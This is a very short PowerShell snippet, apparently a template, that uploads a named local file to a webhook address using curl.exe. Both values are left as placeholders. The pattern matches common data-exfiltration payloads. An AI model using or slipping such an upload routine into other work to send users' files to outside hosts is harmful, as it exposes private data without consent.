$hookurl = '<webhook-address>'
$file = '<file-name>'

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}